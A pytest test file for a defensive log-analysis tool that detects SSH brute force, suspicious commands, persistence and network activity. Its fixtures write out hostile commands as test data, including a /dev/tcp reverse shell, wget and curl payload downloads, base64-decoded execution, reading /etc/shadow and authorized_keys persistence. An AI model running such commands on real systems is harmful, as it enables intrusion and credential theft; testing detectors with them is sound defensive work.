from datetime import datetime
from pathlib import Path

from src.detection.brute_force import (
    BruteForceFinding,
    SuccessfulLoginAfterBruteForceFinding,
    detect_ssh_brute_force,
    detect_successful_login_after_brute_force,
)

from src.detection.suspicious_commands import (
    SuspiciousCommandFinding,
    detect_suspicious_commands,
)

from src.detection.persistence import (
    PersistenceFinding,
    detect_persistence,
)

from src.detection.network_activity import (
    NetworkActivityFinding,
    detect_network_activity,
)

from src.parsers.auth_parser import parse_auth_log

from src.timeline.events import Event


PROJECT_ROOT = Path(__file__).resolve().parents[1]

SAMPLE_AUTH_LOG = (
    PROJECT_ROOT
    / "data"
    / "sample"
    / "auth.log"
)


def get_sample_events():
    return parse_auth_log(
        str(SAMPLE_AUTH_LOG),
        year=2026,
    )


def make_command_event(
    event_id: str,
    command: str,
    event_type: str = "SHELL_COMMAND",
    metadata: dict | None = None,
) -> Event:
    return Event(
        event_id=event_id,
        timestamp=datetime.fromisoformat(
            "2026-10-06T22:20:00"
        ),
        source="bash_history",
        event_type=event_type,
        message=command,
        user="admin",
        source_ip="192.0.2.50",
        command=command,
        severity="INFO",
        raw=command,
        metadata=metadata or {},
    )


def test_brute_force_detection_returns_findings():
    events = get_sample_events()

    findings = detect_ssh_brute_force(events)

    assert findings

    assert all(
        isinstance(
            finding,
            BruteForceFinding,
        )
        for finding in findings
    )


def test_brute_force_detects_four_failures():
    events = get_sample_events()

    findings = detect_ssh_brute_force(
        events,
        threshold=4,
    )

    assert len(findings) == 1

    finding = findings[0]

    assert finding.event_type == "SSH_BRUTE_FORCE"
    assert finding.failed_attempts == 4


def test_brute_force_source_ip():
    events = get_sample_events()

    findings = detect_ssh_brute_force(events)

    finding = findings[0]

    assert finding.source_ip == "192.0.2.50"


def test_brute_force_username():
    events = get_sample_events()

    findings = detect_ssh_brute_force(events)

    finding = findings[0]

    assert finding.username == "admin"


def test_brute_force_severity():
    events = get_sample_events()

    findings = detect_ssh_brute_force(events)

    finding = findings[0]

    assert finding.severity == "HIGH"


def test_brute_force_event_ids():
    events = get_sample_events()

    findings = detect_ssh_brute_force(events)

    finding = findings[0]

    assert len(finding.event_ids) == 4

    assert finding.event_ids == [
        "AUTH-00001",
        "AUTH-00002",
        "AUTH-00003",
        "AUTH-00004",
    ]


def test_brute_force_time_window():
    events = get_sample_events()

    findings = detect_ssh_brute_force(
        events,
        threshold=4,
        window_seconds=300,
    )

    assert len(findings) == 1


def test_no_detection_when_threshold_not_reached():
    events = get_sample_events()

    findings = detect_ssh_brute_force(
        events,
        threshold=5,
    )

    assert findings == []


def test_no_detection_when_window_too_small():
    events = get_sample_events()

    findings = detect_ssh_brute_force(
        events,
        threshold=4,
        window_seconds=5,
    )

    assert findings == []


def test_finding_serialization():
    events = get_sample_events()

    findings = detect_ssh_brute_force(events)

    finding = findings[0]

    data = finding.to_dict()

    assert data["finding_id"] == "BRUTE-FORCE-0001"
    assert data["event_type"] == "SSH_BRUTE_FORCE"
    assert data["severity"] == "HIGH"
    assert data["source_ip"] == "192.0.2.50"
    assert data["username"] == "admin"
    assert data["failed_attempts"] == 4
    assert len(data["event_ids"]) == 4


def test_successful_login_after_brute_force_detected():
    events = get_sample_events()

    findings = detect_successful_login_after_brute_force(
        events
    )

    assert findings

    assert all(
        isinstance(
            finding,
            SuccessfulLoginAfterBruteForceFinding,
        )
        for finding in findings
    )


def test_successful_login_after_brute_force_count():
    events = get_sample_events()

    findings = detect_successful_login_after_brute_force(
        events
    )

    assert len(findings) == 1


def test_successful_login_after_brute_force_event_type():
    events = get_sample_events()

    findings = detect_successful_login_after_brute_force(
        events
    )

    finding = findings[0]

    assert (
        finding.event_type
        == "SSH_BRUTE_FORCE_SUCCESS"
    )


def test_successful_login_after_brute_force_severity():
    events = get_sample_events()

    findings = detect_successful_login_after_brute_force(
        events
    )

    finding = findings[0]

    assert finding.severity == "CRITICAL"


def test_successful_login_after_brute_force_source():
    events = get_sample_events()

    findings = detect_successful_login_after_brute_force(
        events
    )

    finding = findings[0]

    assert finding.source_ip == "192.0.2.50"


def test_successful_login_after_brute_force_username():
    events = get_sample_events()

    findings = detect_successful_login_after_brute_force(
        events
    )

    finding = findings[0]

    assert finding.username == "admin"


def test_successful_login_after_brute_force_failure_count():
    events = get_sample_events()

    findings = detect_successful_login_after_brute_force(
        events
    )

    finding = findings[0]

    assert finding.failed_attempts == 4


def test_successful_login_after_brute_force_session():
    events = get_sample_events()

    findings = detect_successful_login_after_brute_force(
        events
    )

    finding = findings[0]

    assert finding.session_opened is not None


def test_successful_login_after_brute_force_event_sequence():
    events = get_sample_events()

    findings = detect_successful_login_after_brute_force(
        events
    )

    finding = findings[0]

    assert finding.event_ids == [
        "AUTH-00001",
        "AUTH-00002",
        "AUTH-00003",
        "AUTH-00004",
        "AUTH-00005",
        "AUTH-00006",
    ]


def test_successful_login_after_brute_force_serialization():
    events = get_sample_events()

    findings = detect_successful_login_after_brute_force(
        events
    )

    finding = findings[0]

    data = finding.to_dict()

    assert (
        data["finding_id"]
        == "BRUTE-FORCE-SUCCESS-0001"
    )

    assert (
        data["event_type"]
        == "SSH_BRUTE_FORCE_SUCCESS"
    )

    assert data["severity"] == "CRITICAL"
    assert data["source_ip"] == "192.0.2.50"
    assert data["username"] == "admin"
    assert data["failed_attempts"] == 4
    assert data["session_opened"] is not None
    assert len(data["event_ids"]) == 6


def test_no_successful_login_detection_when_threshold_not_reached():
    events = get_sample_events()

    findings = detect_successful_login_after_brute_force(
        events,
        threshold=5,
    )

    assert findings == []


def test_no_successful_login_detection_when_window_too_small():
    events = get_sample_events()

    findings = detect_successful_login_after_brute_force(
        events,
        threshold=4,
        window_seconds=5,
    )

    assert findings == []


def test_suspicious_command_detection_returns_findings():
    events = [
        make_command_event(
            "CMD-00001",
            "wget http://192.0.2.10/payload.sh",
        )
    ]

    findings = detect_suspicious_commands(events)

    assert findings

    assert all(
        isinstance(
            finding,
            SuspiciousCommandFinding,
        )
        for finding in findings
    )


def test_download_command_detected():
    events = [
        make_command_event(
            "CMD-00001",
            "wget http://192.0.2.10/payload.sh",
        )
    ]

    findings = detect_suspicious_commands(events)

    assert len(findings) == 1

    finding = findings[0]

    assert finding.category == "DOWNLOAD"
    assert finding.severity == "MEDIUM"


def test_reverse_shell_detected():
    events = [
        make_command_event(
            "CMD-00002",
            "bash -i >& /dev/tcp/192.0.2.10/4444 0>&1",
        )
    ]

    findings = detect_suspicious_commands(events)

    assert len(findings) == 1

    finding = findings[0]

    assert finding.category == "REVERSE_SHELL"
    assert finding.severity == "CRITICAL"


def test_encoded_execution_detected():
    events = [
        make_command_event(
            "CMD-00003",
            "echo payload | base64 -d | bash",
        )
    ]

    findings = detect_suspicious_commands(events)

    assert len(findings) == 1

    finding = findings[0]

    assert finding.category == "ENCODED_EXECUTION"
    assert finding.severity == "HIGH"


def test_shell_execution_detected():
    events = [
        make_command_event(
            "CMD-00004",
            "bash -c 'whoami'",
        )
    ]

    findings = detect_suspicious_commands(events)

    assert len(findings) == 1

    finding = findings[0]

    assert finding.category == "SHELL_EXECUTION"


def test_credential_access_detected():
    events = [
        make_command_event(
            "CMD-00005",
            "cat /etc/shadow",
        )
    ]

    findings = detect_suspicious_commands(events)

    assert len(findings) == 1

    finding = findings[0]

    assert finding.category == "CREDENTIAL_ACCESS"
    assert finding.severity == "HIGH"


def test_network_recon_detected():
    events = [
        make_command_event(
            "CMD-00006",
            "nmap -sV 192.0.2.0/24",
        )
    ]

    findings = detect_suspicious_commands(events)

    assert len(findings) == 1

    finding = findings[0]

    assert finding.category == "NETWORK_RECON"
    assert finding.severity == "MEDIUM"


def test_sudo_context_is_recorded():
    events = [
        make_command_event(
            "CMD-00007",
            "cat /etc/shadow",
            event_type="SUDO_COMMAND",
        )
    ]

    findings = detect_suspicious_commands(events)

    assert len(findings) == 1

    finding = findings[0]

    assert finding.metadata["sudo_context"] is True


def test_suspicious_command_event_id():
    events = [
        make_command_event(
            "CMD-00008",
            "wget http://192.0.2.10/tool.sh",
        )
    ]

    findings = detect_suspicious_commands(events)

    finding = findings[0]

    assert finding.event_id == "CMD-00008"


def test_suspicious_command_serialization():
    events = [
        make_command_event(
            "CMD-00009",
            "cat /etc/passwd",
        )
    ]

    findings = detect_suspicious_commands(events)

    finding = findings[0]

    data = finding.to_dict()

    assert data["event_type"] == "SUSPICIOUS_COMMAND"
    assert data["category"] == "CREDENTIAL_ACCESS"
    assert data["severity"] == "HIGH"
    assert data["event_id"] == "CMD-00009"


def test_normal_command_is_not_detected():
    events = [
        make_command_event(
            "CMD-00010",
            "ls -la /home/admin",
        )
    ]

    findings = detect_suspicious_commands(events)

    assert findings == []


def test_non_command_event_is_not_detected():
    events = get_sample_events()

    findings = detect_suspicious_commands(events)

    assert findings == []


def test_persistence_detection_returns_findings():
    events = [
        make_command_event(
            "PERSIST-00001",
            "echo ssh-key > /home/admin/.ssh/authorized_keys",
        )
    ]

    findings = detect_persistence(events)

    assert findings

    assert all(
        isinstance(
            finding,
            PersistenceFinding,
        )
        for finding in findings
    )


def test_ssh_authorized_keys_persistence_detected():
    events = [
        make_command_event(
            "PERSIST-00002",
            "cat key.pub >> /home/admin/.ssh/authorized_keys",
        )
    ]

    findings = detect_persistence(events)

    assert len(findings) == 1

    finding = findings[0]

    assert finding.category == "SSH_AUTHORIZED_KEYS"
    assert finding.severity == "HIGH"


def test_cron_persistence_detected():
    events = [
        make_command_event(
            "PERSIST-00003",
            "crontab -e",
        )
    ]

    findings = detect_persistence(events)

    assert len(findings) == 1

    finding = findings[0]

    assert finding.category == "CRON"
    assert finding.severity == "HIGH"


def test_systemd_persistence_detected():
    events = [
        make_command_event(
            "PERSIST-00004",
            "systemctl enable suspicious.service",
        )
    ]

    findings = detect_persistence(events)

    assert len(findings) == 1

    finding = findings[0]

    assert finding.category == "SYSTEMD"
    assert finding.severity == "HIGH"


def test_shell_profile_persistence_detected():
    events = [
        make_command_event(
            "PERSIST-00005",
            "echo command >> ~/.bashrc",
        )
    ]

    findings = detect_persistence(events)

    assert len(findings) == 1

    finding = findings[0]

    assert finding.category == "SHELL_PROFILE"
    assert finding.severity == "MEDIUM"


def test_startup_persistence_detected():
    events = [
        make_command_event(
            "PERSIST-00006",
            "echo command >> /etc/rc.local",
        )
    ]

    findings = detect_persistence(events)

    assert len(findings) == 1

    finding = findings[0]

    assert finding.category == "STARTUP_CONFIGURATION"
    assert finding.severity == "HIGH"


def test_persistence_username():
    events = [
        make_command_event(
            "PERSIST-00007",
            "crontab -e",
        )
    ]

    findings = detect_persistence(events)

    finding = findings[0]

    assert finding.username == "admin"


def test_persistence_source_ip():
    events = [
        make_command_event(
            "PERSIST-00008",
            "systemctl enable suspicious.service",
        )
    ]

    findings = detect_persistence(events)

    finding = findings[0]

    assert finding.source_ip == "192.0.2.50"


def test_persistence_event_id():
    events = [
        make_command_event(
            "PERSIST-00009",
            "crontab -e",
        )
    ]

    findings = detect_persistence(events)

    finding = findings[0]

    assert finding.event_id == "PERSIST-00009"


def test_persistence_sudo_context():
    events = [
        make_command_event(
            "PERSIST-00010",
            "systemctl enable suspicious.service",
            event_type="SUDO_COMMAND",
        )
    ]

    findings = detect_persistence(events)

    finding = findings[0]

    assert finding.metadata["sudo_context"] is True


def test_persistence_serialization():
    events = [
        make_command_event(
            "PERSIST-00011",
            "crontab -e",
        )
    ]

    findings = detect_persistence(events)

    finding = findings[0]

    data = finding.to_dict()

    assert (
        data["event_type"]
        == "PERSISTENCE_DETECTED"
    )

    assert data["category"] == "CRON"
    assert data["severity"] == "HIGH"
    assert data["event_id"] == "PERSIST-00011"


def test_normal_command_has_no_persistence_finding():
    events = [
        make_command_event(
            "PERSIST-00012",
            "ls -la /home/admin",
        )
    ]

    findings = detect_persistence(events)

    assert findings == []


def test_non_command_event_has_no_persistence_finding():
    events = get_sample_events()

    findings = detect_persistence(events)

    assert findings == []


def test_network_activity_detection_returns_findings():
    events = [
        make_command_event(
            "NET-00001",
            "nmap -sV 192.0.2.0/24",
        )
    ]

    findings = detect_network_activity(events)

    assert findings

    assert all(
        isinstance(
            finding,
            NetworkActivityFinding,
        )
        for finding in findings
    )


def test_port_scan_detected():
    events = [
        make_command_event(
            "NET-00002",
            "nmap -sV 192.0.2.0/24",
        )
    ]

    findings = detect_network_activity(events)

    assert len(findings) == 1

    finding = findings[0]

    assert finding.category == "PORT_SCAN"
    assert finding.severity == "HIGH"


def test_network_discovery_detected():
    events = [
        make_command_event(
            "NET-00003",
            "ip addr",
        )
    ]

    findings = detect_network_activity(events)

    assert len(findings) == 1

    finding = findings[0]

    assert finding.category == "NETWORK_DISCOVERY"


def test_connection_enumeration_detected():
    events = [
        make_command_event(
            "NET-00004",
            "ss -tulpn",
        )
    ]

    findings = detect_network_activity(events)

    assert len(findings) == 1

    finding = findings[0]

    assert (
        finding.category
        == "CONNECTION_ENUMERATION"
    )


def test_network_tool_detected():
    events = [
        make_command_event(
            "NET-00005",
            "nc 192.0.2.10 4444",
        )
    ]

    findings = detect_network_activity(events)

    assert len(findings) == 1

    finding = findings[0]

    assert finding.category == "NETWORK_TOOL"


def test_remote_download_detected():
    events = [
        make_command_event(
            "NET-00006",
            "wget https://example.invalid/tool.sh",
        )
    ]

    findings = detect_network_activity(events)

    assert len(findings) == 1

    finding = findings[0]

    assert finding.category == "REMOTE_DOWNLOAD"


def test_network_destination_metadata():
    events = [
        make_command_event(
            "NET-00007",
            "curl https://example.invalid/payload",
            metadata={
                "destination_ip": "192.0.2.10",
                "destination_port": 443,
            },
        )
    ]

    findings = detect_network_activity(events)

    finding = findings[0]

    assert finding.destination_ip == "192.0.2.10"
    assert finding.destination_port == 443


def test_network_username():
    events = [
        make_command_event(
            "NET-00008",
            "nmap -sV 192.0.2.0/24",
        )
    ]

    findings = detect_network_activity(events)

    finding = findings[0]

    assert finding.username == "admin"


def test_network_source_ip():
    events = [
        make_command_event(
            "NET-00009",
            "nmap -sV 192.0.2.0/24",
        )
    ]

    findings = detect_network_activity(events)

    finding = findings[0]

    assert finding.source_ip == "192.0.2.50"


def test_network_event_id():
    events = [
        make_command_event(
            "NET-00010",
            "ss -tulpn",
        )
    ]

    findings = detect_network_activity(events)

    finding = findings[0]

    assert finding.event_id == "NET-00010"


def test_network_sudo_context():
    events = [
        make_command_event(
            "NET-00011",
            "ss -tulpn",
            event_type="SUDO_COMMAND",
        )
    ]

    findings = detect_network_activity(events)

    finding = findings[0]

    assert finding.metadata["sudo_context"] is True


def test_network_serialization():
    events = [
        make_command_event(
            "NET-00012",
            "nmap -sV 192.0.2.0/24",
        )
    ]

    findings = detect_network_activity(events)

    finding = findings[0]

    data = finding.to_dict()

    assert (
        data["event_type"]
        == "NETWORK_ACTIVITY"
    )

    assert data["category"] == "PORT_SCAN"
    assert data["severity"] == "HIGH"
    assert data["event_id"] == "NET-00012"


def test_normal_command_has_no_network_finding():
    events = [
        make_command_event(
            "NET-00013",
            "ls -la /home/admin",
        )
    ]

    findings = detect_network_activity(events)

    assert findings == []


def test_non_command_event_has_no_network_finding():
    events = get_sample_events()

    findings = detect_network_activity(events)

    assert findings == []
